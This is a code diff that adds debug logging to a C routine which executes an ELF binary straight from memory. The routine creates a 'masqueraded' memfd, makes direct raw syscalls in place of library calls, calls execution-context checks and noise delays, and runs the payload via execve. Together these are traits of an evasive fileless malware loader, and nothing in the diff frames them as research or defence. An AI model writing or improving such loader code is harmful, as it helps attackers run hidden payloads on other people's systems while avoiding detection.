@@ -153,22 +153,25 @@ int execute_from_memory(const uint8_t* elf_data, size_t elf_size, char* const ar
     if (randomized_base == MAP_FAILED) {
         return -1;
     }
-
+    DBG("allocated randomized base address: %p\n", randomized_base);
     // Use masqueraded memfd creation
     int memfd = create_masqueraded_memfd();
     if (memfd < 0) {
         syscall2(__NR_munmap, (long)randomized_base, elf_size);
         return -1;
     }
+    DBG("masqueraded memfd created: %d\n", memfd);
 
     check_exec_context();
 
     // Set file size using direct syscall
     if (syscall2(__NR_ftruncate, memfd, elf_size) < 0) {
+        DBG("failed to set memfd size\n");
         syscall1(__NR_close, memfd);
         syscall2(__NR_munmap, (long)randomized_base, elf_size);
         return -1;
     }
+    DBG("memfd size set to: %zu bytes\n", elf_size);
 
 #ifdef COPY_WITH_MMAP
     /* ------------------------------------------------------------------
@@ -228,10 +231,10 @@ int execute_from_memory(const uint8_t* elf_data, size_t elf_size, char* const ar
 
     check_exec_context();
     noise_delay(80);
-
+    DBG("executing from memory via memfd: %s\n", memfd_path);
     // Execute using direct syscall
     syscall3(__NR_execve, (long)memfd_path, (long)argv, (long)envp);
-
+    DBG("execve failed: %s\n", strerror(errno));
     // Cleanup on execve failure
     syscall2(__NR_munmap, (long)randomized_base, elf_size);
     syscall1(__NR_close, memfd);
